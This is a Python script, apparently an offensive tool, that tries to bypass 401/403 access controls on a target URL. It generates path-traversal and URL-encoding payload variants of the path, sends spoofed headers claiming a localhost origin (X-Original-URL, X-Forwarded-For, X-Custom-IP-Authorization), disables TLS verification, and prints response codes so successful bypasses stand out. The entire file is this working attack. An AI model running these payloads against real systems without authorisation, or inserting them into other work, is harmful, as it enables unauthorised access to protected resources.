from datetime import date, datetime
from urllib.parse import urlparse, urlunparse
import sys, argparse, logging, requests
requests.packages.urllib3.disable_warnings()

parser = argparse.ArgumentParser(
description="use this script to fuzz endpoints that return a 401/403"
)
parser.add_argument('--url','-u', action="store", default=None, dest='url',
	help="Specify the target URL")
args = parser.parse_args()

if not len(sys.argv) > 1:
	parser.print_help()
	print()
	exit()

headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"DNT": "1",
"Connection": "close",
"Upgrade-Insecure-Requests": "1"}

prefixPayloads = [
'//', '/;/', '/;//', '/./', '/.//', '/.;/', '/.;//', '/../', '/..', '/..//', '/..;/',
'/..;//', '/../../', '/..//../', '/../..//', '//../../', '/../../../','/../..//../' ,
'/..//../../', '/../../..//', '%2f%2f', '%2f/', '/%2f', '/%3b/', '%2f%3b%2f',
'%2f%3b%2f%2f', '/%2e/', '/%2e//', '/%2e%3b/', '/%2e%3b//', '/%2e%2e/', '/%2e%2e',
'/%2e%2e%3b/', '/%2e%2f/', '/%2e%2e%2f/', '/%252e%253b/', '/%252e%252e%253b/',
'%252f%252f', '%252f/', '/%252f', '/%252e/', '/%252e%252f/', '/%252e%252e%252f/']

suffixPayloads = [
';', '/', '%2f', '/./', '/%2e/', '/../', '/%2e%2e/', '.html', '.json', '#', '/%20']

def preAndPost(parsed):
	finalUrls = []
	### Set up paths with prefix payloads
	for h in range(len(pathPieces)):
	    for p in prefixPayloads:
	        parsed = parsed._replace(path=path.replace('/' + pathPieces[h], p + pathPieces[h]))
	        finalUrls.append(urlunparse(parsed))

	### Set up paths with suffix payloads
	for h in range(len(pathPieces)):
	    for p in suffixPayloads:
	        parsed = parsed._replace(path=path.replace(pathPieces[h], pathPieces[h] + p))
	        finalUrls.append(urlunparse(parsed))

	return finalUrls

def sendHeaders(url, path):
	headers["X-Original-URL"] = path
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: X-Original-URL: {}\n".format(resp.status_code, len(resp.text), headers["X-Original-URL"]))
	headers.pop("X-Original-URL")

	headers["X-Forwarded-For"] = "127.0.0.1"
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: X-Forwarded-For: {}\n".format(resp.status_code, len(resp.text), headers["X-Forwarded-For"]))
	headers.pop("X-Forwarded-For")

	headers["X-Custom-IP-Authorization"] = "127.0.0.1"
	resp = requests.get(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Header: X-Custom-IP-Authorization: {}\n".format(resp.status_code, len(resp.text), headers["X-Custom-IP-Authorization"]))
	headers.pop("X-Custom-IP-Authorization")

def sendFinalPayloads(finalUrls):
	for url in finalUrls:
		parsed = urlparse(url)
		path = parsed.path
		resp = requests.get(url, headers=headers, verify=False)
		print("Response code: {}   Response length: {}   Path: {}\n".format(resp.status_code, len(resp.text), path))

def sendOPTIONS():
	resp = requests.options(url, headers=headers, verify=False)
	print("Response code: {}   Response length: {}   Sent OPTIONS method. \n".format(resp.status_code, len(resp.text)))

	if len(resp.text) < 1:
		print("Response length was 0 so probably NOT worth checking out....\n")

	print("Response Headers: ")
	for h,v in resp.request.headers.items():
		print("{}: {}".format(h,v))

url = args.url
parsed = urlparse(url)
path = parsed.path
pathPieces = ' '.join(parsed.path.split('/')).split()

finalUrls = preAndPost(parsed)

sendHeaders(url, path)
sendFinalPayloads(finalUrls)
sendOPTIONS()
